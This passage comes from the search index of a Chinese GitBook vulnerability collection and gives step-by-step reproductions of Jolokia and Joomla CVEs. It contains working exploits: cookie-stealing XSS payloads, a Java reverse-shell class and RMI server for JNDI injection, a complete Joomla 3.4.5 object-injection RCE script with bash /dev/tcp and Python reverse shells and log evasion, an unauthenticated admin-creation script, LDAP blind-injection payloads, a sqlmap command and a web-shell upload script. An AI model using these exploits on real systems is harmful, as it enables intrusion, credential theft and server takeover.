X-Requested-With: XMLHttpRequest Content-Length: 187 Origin: http://www.0-sec.org:8091 Connection: close Referer: http://www.0-sec.org:8091/user/release.html Cookie: PHPSESSID=t616fln4me32an09rj6v67vr5b ajax=1&isshow=&molds=article&tid=2&title=%3Cdetails+open+ontoggle%3D+confirm(document%5B%60coo%60%2B%60kie%60%5D)%3E&keywords=&litpic=&description=123&body=%3Cp%3E123%3Cbr%2F%3E%3C%2Fp%3E 根据url定位到release函数该函数主要是先检查是否是登录状态然后检查是否存在违禁词汇，其中违禁词汇取的是webconf[\\'mingan\\']的值，由前篇文章可知数据存放在数据库中然后通过缓存读取相关信息，可以直接输出一下 过滤的东西和XSS关系不大，主要是涉及到文章敏感汉字之类的，然后被保存到数据库中的时候<>变成了 看下是如何进行操作的，继续跟进该函数，通过frparam函数进行操作之后对title进行赋值frparam函数在获取到相关值后调用format_param函数对数据进行处理，由于传入的int的值为1.所以对传入的参数进行了html实体编码所以在数据库中存储的是进行过实体编码的xss payload最后登入后台看下编辑函数 POST /admin.php/Article/editarticle.html HTTP/1.1 Host: www.0-sec.org:8091 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 340 Origin: http://www.0-sec.org:8091 Connection: close Referer: http://www.0-sec.org:8091/admin.php/Article/editarticle/id/34.html Cookie: PHPSESSID=t616fln4me32an09rj6v67vr5b go=1&id=34&title=%3Cdetails+open+ontoggle%3D+confirm(document%5B%60coo%60%2B%60kie%60%5D)%3E&tid=2&seo_title=%3Cdetails+open+ontoggle%3D+confirm(document%5B%60coo%60%2B%60kie%60%5D)%3E&hits=0&keywords=&litpic=&file=&description=123&orders=0&tags=&isshow=0&addtime=2020-05-28+17%3A17%3A39&target=&ownurl=&body=%3Cp%3E123%3Cbr%2F%3E%3C%2Fp%3E 看一下数据中的更新情况，又将\\变成了\\<>,所以触发了XSS漏洞定位到漏洞函数editarticle，看到同样调用了frparam函数frparam函数由于没有传入参数会直接返回url中的数据在请求包中可以看到是已经将html实体化编码变成了原字符，所以data取到的数据时没有经过html编码的数据所以在进行update更新操作的时候就会向数据库写入未经html实体化编码的数据 参考链接 https://xz.aliyun.com/t/7861 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:42 "},"Web安全/Jolokia/（CVE-2018-1000129）Jolokia 反射型xss/（CVE-2018-1000129）Jolokia 反射型xss.html":{"url":"Web安全/Jolokia/（CVE-2018-1000129）Jolokia 反射型xss/（CVE-2018-1000129）Jolokia 反射型xss.html","title":"（CVE-2018-1000129）Jolokia 反射型xss","keywords":"","body":"（CVE-2018-1000129）Jolokia 反射型xss 一、漏洞简介 二、漏洞影响 Jolokia \\ 三、复现过程 Jolokia Web应用程序容易受到经典的\" **反射跨站点脚本（XSS）\"**攻击。默认情况下，Jolokia返回带有application / json内容类型的响应，因此在大多数情况下，将用户提供的输入插入响应中并不是什么大问题。但是通过阅读源代码发现，仅通过向mimeType请求添加GET参数就可以修改响应的Content-Type ： http://www.0-sec.org:8161/api/jolokia/read?mimeType=text/html 之后，相对容易地找到至少一个在响应中按原样插入URL参数的情况： http://www.0-sec.org:8161/api/jolokia/read?mimeType=text/html 使用text/htmlContent Type，可以实现经典的反射XSS攻击。利用此问题，攻击者可以在应用程序输入参数内提供任意客户端JavaScript代码，这些代码最终将在最终用户的Web浏览器中呈现和执行。可以利用它来窃取易受攻击的域中的cookie，并有可能获得对用户身份验证会话的未授权访问，更改易受攻击的网页的内容或损害用户的Web浏览器。 Jolokia反射型xss/media/rId24.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:45 "},"Web安全/Jolokia/（CVE-2018-1000130）Jolokia 远程代码执行漏洞/（CVE-2018-1000130）Jolokia 远程代码执行漏洞.html":{"url":"Web安全/Jolokia/（CVE-2018-1000130）Jolokia 远程代码执行漏洞/（CVE-2018-1000130）Jolokia 远程代码执行漏洞.html","title":"（CVE-2018-1000130）Jolokia 远程代码执行漏洞","keywords":"","body":"（CVE-2018-1000130）Jolokia 远程代码执行漏洞 一、漏洞简介 Jolokia服务的代理模式默认情况下在1.5.0版之前容易受到JNDI注入的攻击。当以代理模式部署Jolokia代理时，有权访问Jolokia Web端点的外部攻击者可以通过JNDI注入攻击远程执行任意代码。由于Jolokia库使用用户提供的输入启动LDAP / RMI连接，因此有可能造成这种攻击。 利用条件： 目标网站存在 /jolokia 或 /actuator/jolokia 接口 目标使用了 jolokia-core 依赖（版本要求暂未知）并且环境中存在相关 MBean 目标可以请求攻击者的服务器（请求可出外网） 实际测试 RMI 注入受目标 JDK 版本影响，jdk \\ 二、漏洞影响 Jolokia \\ 三、复现过程 漏洞分析 利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm 设置 connectionURL 地址为 RMI Service URL 设置 contextFactory 为 RegistryContextFactory 停止 Realm 启动 Realm 以触发指定 RMI 地址的 JNDI 注入，造成 RCE 漏洞 漏洞复现 步骤一：查看已存在的 MBeans 访问 /jolokia/list 接口，查看是否存在 type=MBeanFactory 和 createJNDIRealm 关键词。 步骤二：准备要执行的 Java 代码 需要修改脚本里对应的反弹shell的ip和端口 /** * javac -source 1.5 -target 1.5 JNDIObject.java * * Build By LandGrey * */ import java.io.File; import java.io.InputStream; import java.io.OutputStream; import java.net.Socket; public class JNDIObject { static { try{ String ip = \"your-vps-ip\"; String port = \"443\"; String py_path = null; String[] cmd; if (!System.getProperty(\"os.name\").toLowerCase().contains(\"windows\")) { String[] py_envs = new String[]{\"/bin/python\", \"/bin/python3\", \"/usr/bin/python\", \"/usr/bin/python3\", \"/usr/local/bin/python\", \"/usr/local/bin/python3\"}; for(int i = 0; i 0) { so.write(pi.read()); } while(pe.available() > 0) { so.write(pe.read()); } while(si.available() > 0) { po.write(si.read()); } so.flush(); po.flush(); Thread.sleep(50L); try { p.exitValue(); break; } catch (Exception e) { } } p.destroy(); s.close(); }catch (Throwable e){ e.printStackTrace(); } } } 步骤三：架设恶意 rmi 服务 https://github.com/ianxtianxt/marshalsec 使用下面命令架设对应的 rmi 服务： java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389 步骤四：监听反弹 shell 的端口 一般使用 nc 监听端口，等待反弹 shell nc -lvp 上面java脚本里面自己设置的端口 步骤五：发送恶意 payload 根据实际情况修改 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。 #!/usr/bin/env python3 # coding: utf-8 # Referer: https://ricterz.me/posts/2019-03-06-yet-another-way-to-exploit-spring-boot-actuators-via-jolokia.txt import requests url = 'http://127.0.0.1:8080/jolokia' create_realm = { \"mbean\": \"Tomcat:type=MBeanFactory\", \"type\": \"EXEC\", \"operation\": \"createJNDIRealm\", \"arguments\": [\"Tomcat:type=Engine\"] } wirte_factory = { \"mbean\": \"Tomcat:realmPath=/realm0,type=Realm\", \"type\": \"WRITE\", \"attribute\": \"contextFactory\", \"value\": \"com.sun.jndi.rmi.registry.RegistryContextFactory\" } write_url = { \"mbean\": \"Tomcat:realmPath=/realm0,type=Realm\", \"type\": \"WRITE\", \"attribute\": \"connectionURL\", \"value\": \"rmi://your-vps-ip:1389/JNDIObject\" } stop = { \"mbean\": \"Tomcat:realmPath=/realm0,type=Realm\", \"type\": \"EXEC\", \"operation\": \"stop\", \"arguments\": [] } start = { \"mbean\": \"Tomcat:realmPath=/realm0,type=Realm\", \"type\": \"EXEC\", \"operation\": \"start\", \"arguments\": [] } flow = [create_realm, wirte_factory, write_url, stop, start] for i in flow: print('%s MBean %s: %s ...' % (i['type'].title(), i['mbean'], i.get('operation', i.get('attribute')))) r = requests.post(url, json=i) r.json() print(r.status_code) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:46 "},"Web安全/Joomla/（CVE-2015-8562）Joomla 3.4.5 反序列化漏洞/（CVE-2015-8562）Joomla 3.4.5 反序列化漏洞.html":{"url":"Web安全/Joomla/（CVE-2015-8562）Joomla 3.4.5 反序列化漏洞/（CVE-2015-8562）Joomla 3.4.5 反序列化漏洞.html","title":"（CVE-2015-8562）Joomla 3.4.5 反序列化漏洞","keywords":"","body":"（CVE-2015-8562）Joomla 3.4.5 反序列化漏洞 一、漏洞简介 本漏洞根源是PHP5.6.13前的版本在读取存储好的session时，如果反序列化出错则会跳过当前一段数据而去反序列化下一段数据。而Joomla将session存储在Mysql数据库中，编码是utf8，当我们插入4字节的utf8数据时则会导致截断。截断后的数据在反序列化时就会失败，最后触发反序列化漏洞。 二、漏洞影响 Joomla 1.5.x, 2.x, and 3.x before 3.4.6 PHP 5.6 \\ 三、复现过程 我们不带User-Agent头，先访问一次目标主页，记下服务端返回的Cookie： Joomla3.4.5反序列化漏洞/media/rId24.png) 再用如下脚本生成POC： feed_url = \"phpinfo();JFactory::getConfig();exit;\"; $this->javascript = 9999; $this->cache_name_function = \"assert\"; $this->sanitize = new JDatabaseDriverMysql(); $this->cache = true; } } class JDatabaseDriverMysqli { protected $a; protected $disconnectHandlers; protected $connection; function __construct() { $this->a = new JSimplepieFactory(); $x = new SimplePie(); $this->connection = 1; $this->disconnectHandlers = [ [$x, \"init\"], ]; } } $a = new JDatabaseDriverMysqli(); $poc = serialize($a); $poc = str_replace(\"\\x00*\\x00\", '\\\\0\\\\0\\\\0', $poc); echo \"123}__test|{$poc}\\xF0\\x9D\\x8C\\x86\"; Joomla3.4.5反序列化漏洞/media/rId25.png) 123}__test|O:21:\"JDatabaseDriverMysqli\":3:{s:4:\"\\0\\0\\0a\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:5:\"cache\";b:1;s:19:\"cache_name_function\";s:6:\"assert\";s:10:\"javascript\";i:9999;s:8:\"feed_url\";s:37:\"phpinfo();JFactory::getConfig();exit;\";}i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";i:1;}? 将生成好的POC作为User-Agent，带上第一步获取的Cookie发包，这一次发包，脏数据进入Mysql数据库。然后同样的包再发一次，我们的代码被执行： Joomla3.4.5反序列化漏洞/media/rId26.png) poc Blind RCE: python joomla-cve-2015-8562.py -t http:/// --cmd $ touch /tmp/test Spawn Reverse Shell: python joomla-cve-2015-8562.py -t http:/// -l -p [-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: http:/// [-] Uploading python reverse shell [+] Spawning reverse shell.... Listening on [0.0.0.0] (family 0, port 1337) $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) #!/usr/bin/python # Exploit Title: Joomla 1.5 - 3.4.5 Object Injection RCE # Date: 15/09/2017 # Author: Gary@ Sec-1 ltd # Modified: Andrew McNicol BreakPoint Labs (@0xcc_labs) # Modified: Paolo Stagno (@Void_Sec) - https://voidsec.com # Vendor Homepage: https://www.joomla.org/ # Software Link: http://joomlacode.org/gf/project/joomla/frs/ # Version: Joomla 1.5 - 3.4.5 # Tested on: Debian 3.2.89-2 x86_64 GNU/Linux (Joomla! 3.2.1 Stable) # CVE : CVE-2015-8562 ''' Blind RCE: python joomla-cve-2015-8562.py -t http://192.168.0.1/ --cmd $ touch /tmp/test Spawn Reverse Shell: python joomla-cve-2015-8562.py -t http://192.168.0.1/ -l 192.168.0.2 -p 1337 [-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: http://192.168.0.1/ [-] Uploading python reverse shell with LHOST:192.168.1.119 and LPORT:1337 [+] Spawning reverse shell.... Listening on [0.0.0.0] (family 0, port 1337) $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) ''' import requests import subprocess import argparse import sys import base64 import string import random import time import urllib3 def id_generator(size=6, chars=string.ascii_uppercase + string.digits): return str(''.join(random.choice(chars) for _ in range(size))) def get_url(url, user_agent, ua_method, proxyDict): if ua_method == True : # Defaul PoC headers = { 'User-Agent': user_agent } else: # Firefox user_agent and x-forwarded-for method to evade log and lower detection headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0', 'X-Forwarded-For': user_agent } try: cookies = requests.get(url,headers=headers, proxies=proxyDict, verify=False).cookies for _ in range(3): response = requests.get(url, headers=headers,cookies=cookies, proxies=proxyDict, verify=False) return response except requests.exceptions.MissingSchema: print \"\\033[1;31;10m\\n[!] Missing http:// or https:// from Target URL\\n\\033[1;37;10m\" sys.exit(1) def php_str_noquotes(data): #Convert string to chr(xx).chr(xx) for use in php encoded = \"\" for char in data: encoded += \"chr({0}).\".format(ord(char)) return encoded[:-1] def generate_payload(php_payload): php_payload = \"eval({0})\".format(php_str_noquotes(php_payload)) terminate = '\\xf0\\xfd\\xfd\\xfd'; exploit_template = r'''}__test|O:21:\"JDatabaseDriverMysqli\":3:{s:2:\"fc\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:8:\"feed_url\";''' injected_payload = \"{};JFactory::getConfig();exit\".format(php_payload) exploit_template += r'''s:{0}:\"{1}\"'''.format(str(len(injected_payload)), injected_payload) exploit_template += r''';s:19:\"cache_name_function\";s:6:\"assert\";s:5:\"cache\";b:1;s:11:\"cache_class\";O:20:\"JDatabaseDriverMysql\":0:{}}i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";b:1;}''' + terminate return exploit_template def main(): parser = argparse.ArgumentParser(prog='joomla-cve-2015-8562.py', description='\\033[1;37;10mJoomla Object Injection RCE CVE-2015-8652') parser.add_argument('-t', dest='RHOST', required=True, help='\\033[1;37;10mRemote Target Joomla Server (http://)') parser.add_argument('-l', dest='LHOST', help='\\033[1;37;10mLocal IP for Reverse Shell') parser.add_argument('-p', dest='LPORT', help='\\033[1;37;10mLocal Port for Reverse Shell') parser.add_argument('--cmd', dest='cmd', action='store_true', help='\\033[1;37;10mDrop into blind RCE') parser.add_argument('--u', dest='method', action='store_true', help='\\033[1;37;10mSwitch from X-Forwarded-For to User-Agent (less stealthy)') parser.add_argument('--b', dest='bash', action='store_true', help='\\033[1;37;10mSwitch from Python reverse shell to Bash') parser.add_argument('--proxy', dest='proxy', default='None', help='\\033[1;37;10mIP of web proxy to go through (http://127.0.0.1:8080)') args = parser.parse_args() if args.proxy is not None: proxyDict = { \"http\" : args.proxy, \"https\" : args.proxy } else: proxyDict = {} if args.cmd: print \"\\033[1;37;10m[-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: {}\".format(args.RHOST) print \"\\033[1;32;10m[+] Dropping into shell-like environment to perform blind RCE\" while True: command = raw_input('\\033[1;37;10m$ ') cmd_str = \"system('{}');\".format(command) pl = generate_payload(cmd_str) print get_url(args.RHOST, pl, args.method, proxyDict) # Spawn Reverse Shell using Netcat listener & Python shell on victim elif args.LPORT and args.LPORT: shell_name = id_generator() connection = \"'{}', {}\".format(args.LHOST, args.LPORT) if args.bash == True : comm = \"bash\" shell_name = shell_name+\".sh\" # pentestmonkey's Bash reverse shell one-liner: str_shell = 'bash -i >& /dev/tcp/{}/{} 0>&1'.format(args.LHOST, args.LPORT) payload = '''echo \"'''+str_shell+'''\" > /tmp/'''+shell_name+'''''' else : comm = \"python\" shell_name = shell_name+\".py\" # pentestmonkey's Python reverse shell one-liner: str_shell = '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('''+connection+'''));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);''' # Base64 encoded the Python reverse shell as some chars were messing up in the exploit encoded_comm = base64.b64encode(str_shell) payload = \"echo {} | base64 -d > /tmp/{}\".format(encoded_comm, shell_name) print \"\\033[1;37;10m[-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: {}\".format(args.RHOST) print \"\\033[1;32;10m[+] Spawning listener on {}:{}\".format(args.LHOST, args.LPORT) listener = subprocess.Popen(args=[\"gnome-terminal\", \"--command=nc -lvp \"+args.LPORT]) time.sleep(5) print \"\\033[1;37;10m[-] Uploading reverse shell to /tmp/{}\".format(shell_name) pl = generate_payload(\"system('\"+payload+\"');\") print get_url(args.RHOST, pl, args.method, proxyDict) time.sleep(2) print \"\\033[1;32;10m[+] Spawning reverse shell...\" print \"\\033[1;33;10m[-] Check if the listener caught the shell\\033[1;37;10m\" pl = generate_payload(\"system('{} /tmp/{}');\".format(comm, shell_name)) print get_url(args.RHOST, pl, args.method, proxyDict) else: print '\\033[1;31;10m\\n[!] Missing Arguments\\n\\033[1;37;10m' parser.print_help() if __name__ == \"__main__\": try: # Suppress SSL Warning due to unverified HTTPS requests. # See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) main() except KeyboardInterrupt: print \"\\033[1;31;10mQuitting...\" sys.exit(0) 参考链接 https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2015-8562 https://github.com/VoidSec/Joomla\\_CVE-2015-8562 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:52 "},"Web安全/Joomla/（CVE-2016-8869）Joomla 3.4.4-3.6.3 未授权创建特权用户/（CVE-2016-8869）Joomla 3.4.4-3.6.3 未授权创建特权用户.html":{"url":"Web安全/Joomla/（CVE-2016-8869）Joomla 3.4.4-3.6.3 未授权创建特权用户/（CVE-2016-8869）Joomla 3.4.4-3.6.3 未授权创建特权用户.html","title":"（CVE-2016-8869）Joomla 3.4.4-3.6.3 未授权创建特权用户","keywords":"","body":"（CVE-2016-8869）Joomla 3.4.4-3.6.3 未授权创建特权用户 一、漏洞简介 网站关闭注册的情况下仍可创建用户，默认状态下用户需要用邮件激活，但需要开启注册功能才能激活。 二、漏洞影响 Joomla 3.4.4-3.6.3 三、复现过程 首先在后台关闭注册功能，关闭后首页没有注册选项： Joomla3.4.4-3.6.3未授权创建特权用户/media/rId24.png) .然后通过访问index.php抓包获取cookie，通过看index.php源码获取token： Joomla3.4.4-3.6.3未授权创建特权用户/media/rId25.png) 构造注册请求： POST /index.php/component/users/?task=registration.register HTTP/1.1 ... Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryefGhagtDbsLTW5qI ... Cookie: yourcookie ------WebKitFormBoundaryefGhagtDbsLTW5qI Content-Disposition: form-data; name=\"user[name]\" attacker ------WebKitFormBoundaryefGhagtDbsLTW5qI Content-Disposition: form-data; name=\"user[username]\" attacker ------WebKitFormBoundaryefGhagtDbsLTW5qI Content-Disposition: form-data; name=\"user[password1]\" attacker ------WebKitFormBoundaryefGhagtDbsLTW5qI Content-Disposition: form-data; name=\"user[password2]\" attacker ------WebKitFormBoundaryefGhagtDbsLTW5qI Content-Disposition: form-data; name=\"user[email1]\" attacker@my.local ------WebKitFormBoundaryefGhagtDbsLTW5qI Content-Disposition: form-data; name=\"user[email2]\" attacker@my.local ------WebKitFormBoundaryefGhagtDbsLTW5qI Content-Disposition: form-data; name=\"option\" com_users ------WebKitFormBoundaryefGhagtDbsLTW5qI Content-Disposition: form-data; name=\"task\" user.register ------WebKitFormBoundaryefGhagtDbsLTW5qI Content-Disposition: form-data; name=\"yourtoken\" 1 ------WebKitFormBoundaryefGhagtDbsLTW5qI-- 发包，成功注册： Joomla3.4.4-3.6.3未授权创建特权用户/media/rId26.png) 补充 2016-10-27 更新：默认情况下，新注册的用户需要通过注册邮箱激活后才能使用。并且： Joomla3.4.4-3.6.3未授权创建特权用户/media/rId28.jpg) 由于$data['activation']的值会被覆盖，所以我们也没有办法直接通过请求更改用户的激活状态。 2016-11-01 更新： 感谢三好学生和D的提示，可以使用邮箱激活的前提是网站开启了注册功能，否则不会成功激活。 我们看激活时的代码，在components/com_users/controllers/registration.php中第28-99行的activate函数： public function activate() { $user = JFactory::getUser(); $input = JFactory::getApplication()->input; $uParams = JComponentHelper::getParams('com_users'); ... // If user registration or account activation is disabled, throw a 403. if ($uParams->get('useractivation') == 0 || $uParams->get('allowUserRegistration') == 0) { JError::raiseError(403, JText::_('JLIB_APPLICATION_ERROR_ACCESS_FORBIDDEN')); return false; } ... } 这里可以看到仅当开启注册功能时才允许激活，否则返回403。 poc Joomla3.4.4-3.6.3未授权创建特权用户/media/rId30.png) # coding: utf-8 # CVE-2016-8869 # author: Anka9080 import re import requests import random def extract_token(resp): match = re.search(r'name=\"([a-f0-9]{32})\" value=\"1\"', resp.text, re.S) if match is None: print(\"[!] Cannot find CSRF token\") return None print('[*] Your token is '+match.group(1)) return match.group(1) def poc(target): headers = { \"Content-Type\":\"application/x-www-form-urlencoded\" } proxies = { 'http':'127.0.0.1:8080' } s = requests.Session() r = s.get(target+'index.php/component/users/?task=registration.register',proxies=proxies) # get cookie token = extract_token(r) # print r.headers randstr = '_'+str(random.randint(1,10000)) # build post data print('[*] create user: {}'.format('admin'+randstr)) data = { # User object 'task':(None,'user.register'), 'option':(None,'com_users'), 'user[name]': (None,'admin'+randstr), 'user[username]': (None,'admin'+randstr), 'user[password1]': (None,'admin'), 'user[password2]': (None,'admin'), 'user[email1]': (None,'admin'+randstr +'@xx.com'), 'user[email2]': (None,'admin'+randstr +'@xx.com'), 'user[groups][]': (None,'7'), # Administrator! token:(None,'1') } try: r = s.post(target+'index.php/component/users/?task=registration.register',files=data,proxies=proxies,allow_redirects=False) if 'index.php?option=com_users&view=registration' in r.headers['location']: print('[+] {} is vul !'.format(target)) return True except Exception , e: print('[!] err: {}'.format(str(e))) return False if __name__ == '__main__': poc('http://localhost/joomla/Joomla_3.6.3-Stable-Full_Package/') 参考链接 https://paper.seebug.org/86/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:53 "},"Web安全/Joomla/（CVE-2017-14596）Joomla! 1.5 = 3.7.5 LDAP注入绕过登录认证/（CVE-2017-14596）Joomla! 1.5 = 3.7.5 LDAP注入绕过登录认证.html":{"url":"Web安全/Joomla/（CVE-2017-14596）Joomla! 1.5 = 3.7.5 LDAP注入绕过登录认证/（CVE-2017-14596）Joomla! 1.5 = 3.7.5 LDAP注入绕过登录认证.html","title":"（CVE-2017-14596）Joomla! 1.5 = 3.7.5 LDAP注入绕过登录认证","keywords":"","body":"（CVE-2017-14596）Joomla! 1.5 \\ 一、漏洞简介 通过在登录页面利用该漏洞进行攻击，非特权的远程攻击者可以提取出LDAP服务器中所有的用户凭证（用于安装Joomla!），这些凭证包括特权用户以及Joomla！管理员的用户名以及密码。获取到这些凭证之后，攻击者就可以使用这些信息来登录Joomla！的管理员控制面板并完全接管Joomla！，或者通过上传自定义的Joomla！扩展实现远程代码执行并相关的Web服务器。 二、漏洞影响 Joomla! 1.5 \\ 三、复现过程 漏洞分析 我们的代码分析解决方案RIPS能够自动化识别出下列代码段中的安全漏洞。首先在LoginController中，Joomla！应用可以从登录表单中接收用户提供的凭证数据。 /administrator/components/com_login/controller.php Joomla!1.5 凭证数据会被传递给login方法，而login方法中又会调用authenticate方法。 /libraries/cms/application/cms.php Joomla!1.5 /libraries/joomla/authentication/authentication.php Joomla!1.5 authenticate方法可以向onUserAuthenticate方法发送用户凭证，具体方法取决于管理员所使用的身份验证插件。如果Joomla！在进行身份验证时使用的是LDAP，那么这里将需要调用LDAP插件的内置方法。 /plugins/authentication/ldap/ldap.php Joomla!1.5 在LDAP插件中，username嵌入在LDAP查询语句（在search_string选项中指定）中。根据Joomla！的官方文档，search_string配置选项是一个用于搜索用户的查询字符串，其中的[search]会被登录表单中的搜索文本直接替换，例如\"uid=[search]\"。接下来，LDAP查询语句会被传递给LdapClient中的simple_search方法，这个函数负责与LDAP服务器建立连接并执行ldap_search方法。 /libraries/vendor/joomla/ldap/src/LdapClient.php Joomla!1.5 即使RIPS没有能够发现LDAP查询字符串是从一个外部配置文件加载进来的，但RIPS仍然能够成功检测并报告这个漏洞的根本原因：传递给ldap_search函数的用户输入虽然嵌入在了LDAP查询语句中，但输入数据并没有经过数据清洗。 漏洞复现 由于没有对LDAP查询语句中的username数据进行过滤，这将导致攻击者能够修改LDAP搜索的结果集合。通过使用特殊字符并观察不同的认证错误信息，攻击者将能够通过不断地发送测试payload来暴力破解出凭证字符。 XXX;(&(uid=Admin)(userPassword=A*)) XXX;(&(uid=Admin)(userPassword=B*)) XXX;(&(uid=Admin)(userPassword=C*)) ... XXX;(&(uid=Admin)(userPassword=s*)) ... XXX;(&(uid=Admin)(userPassword=se*)) ... XXX;(&(uid=Admin)(userPassword=sec*)) ... XXX;(&(uid=Admin)(userPassword=secretPassword)) 其中的每一行Payload代码都可以从LDAP服务器中提取出目标数据，而这也是一种相对非常高效的LDAP盲注攻击方式。 可通过一次次爆破尝试出后台账号密码Joomla!1.5Joomla!1.5 参考链接 https://www.freebuf.com/articles/web/149059.html https://twitter.com/ripstech/status/1094999251417993216 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:56 "},"Web安全/Joomla/（CVE-2017-8917）Joomla 3.7.0 QL注入漏洞/（CVE-2017-8917）Joomla 3.7.0 QL注入漏洞.html":{"url":"Web安全/Joomla/（CVE-2017-8917）Joomla 3.7.0 QL注入漏洞/（CVE-2017-8917）Joomla 3.7.0 QL注入漏洞.html","title":"（CVE-2017-8917）Joomla 3.7.0 QL注入漏洞","keywords":"","body":"（CVE-2017-8917）Joomla 3.7.0 QL注入漏洞 一、漏洞简介 二、漏洞影响 Joomla 3.7.0 三、复现过程 http://www.0-sec.org:8080/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1) Joomla3.7.0QL注入漏洞/media/rId24.png) 补充 sqlmap -u \"http://www.0-sec.org/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:55 "},"Web安全/Joomla/（CVE-2020-10238）Joomla = 3.9.15 远程命令执行漏洞/（CVE-2020-10238）Joomla = 3.9.15 远程命令执行漏洞.html":{"url":"Web安全/Joomla/（CVE-2020-10238）Joomla = 3.9.15 远程命令执行漏洞/（CVE-2020-10238）Joomla = 3.9.15 远程命令执行漏洞.html","title":"（CVE-2020-10238）Joomla = 3.9.15 远程命令执行漏洞","keywords":"","body":"（CVE-2020-10238）Joomal \\ 一、漏洞简介 二、漏洞影响 \\ 三、复现过程 http://www.0-sec.org/administrator/index.php?option=com_templates&view=template&id=506&file=aG9tZQ== 使用admin进行登录 Joomla 思路： 首先超级管理员跟管理员的后台界面是不同的 将恶意代码添加到index.php里面 使用管理员账户修改index.php，通过超级管理员进行index.php的文件编辑来获取到返回请求。 Joomla 为了方便阅读，这里我们删掉index.php的内容，只保留shell Joomla 黄色部分为超级管理员的token，Joomal通过此令牌来防止csrf 这里我们先在burp里面保存此请求，先试用管理员账户进行登录，获取一下管理员账户的token。 Joomla Joomla 如上图黄色部分为管理员的token，我们用管理员的token替换超级管理员的token，并且编辑url Joomla Joomla Joomla poc Joomla #!/usr/bin/python import sys import requests import re import argparse def extract_token(resp): match = re.search(r'name=\"([a-f0-9]{32})\" value=\"1\"', resp.text, re.S) if match is None: print(\"[-] Cannot find CSRF token!\\n\") + \"[-] You are not admin account!\" return None return match.group(1) def try_admin_login(sess,url,uname,upass): admin_url = url+'/administrator/index.php' print('[+] Getting token for admin login') resp = sess.get(admin_url, verify=True) token = extract_token(resp) # print token if not token: return False print('[+] Logging in to admin') data = { 'username': uname, 'passwd': upass, 'task': 'login', token: '1' } resp = sess.post(admin_url, data=data, verify=True) if 'task=profile.edit' not in resp.text: print('[!] Admin Login Failure!') return None print('[+] Admin Login Successfully!') return True def rce(sess,url,cmd): getjs = url + '/administrator/index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA%3D%3D' resp = sess.get(getjs, verify=True) token = extract_token(resp) if (token==None) : sys.exit() filename='error.php' shlink = url + '/administrator/index.php?option=com_templates&view=template&id=506&file=506&file=L2Vycm9yLnBocA%3D%3D' shdata_up = { 'jform[source]': \"\", 'task': 'template.apply', token: '1', 'jform[extension_id]': '506', 'jform[filename]': '/' + filename } shreq = sess.post(shlink, data=shdata_up) path2shell = '/templates/protostar/error.php?cmd='+cmd # print '[+] Shell is ready to use: ' + str(path2shell) print '[+] Checking:' shreq = sess.get(url + path2shell) shresp = shreq.text print shresp + '[+] Shell link: \\n' + (url + path2shell) print '[+] Module finished.' def main() : # Construct the argument parser ap = argparse.ArgumentParser() # Add the arguments to the parser ap.add_argument(\"-url\", \"--url\", required=True, help=\" URL for your Joomla target\") ap.add_argument(\"-u\", \"--username\", required=True, help=\"username\") ap.add_argument(\"-p\", \"--password\", required=True, help=\"password\") ap.add_argument(\"-cmd\", \"--command\", default=\"whoami\", help=\"command\") args = vars(ap.parse_args()) # target url = format(str(args['url'])) print '[+] Your target: ' + url # username uname = format(str(args['username'])) # password upass = format(str(args['password'])) # command command = format(str(args['command'])) sess = requests.Session() if(try_admin_login(sess,url,uname,upass) == None) : sys.exit() rce(sess,url,command) if __name__ == \"__main__\": sys.exit(main()) 参考链接 https://github.com/HoangKien1020/CVE-2020-10238/tree/master/CVE-2020-10238 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:55:00 "},"Web安全/Joomla/（CVE-2020-11890）Joomla 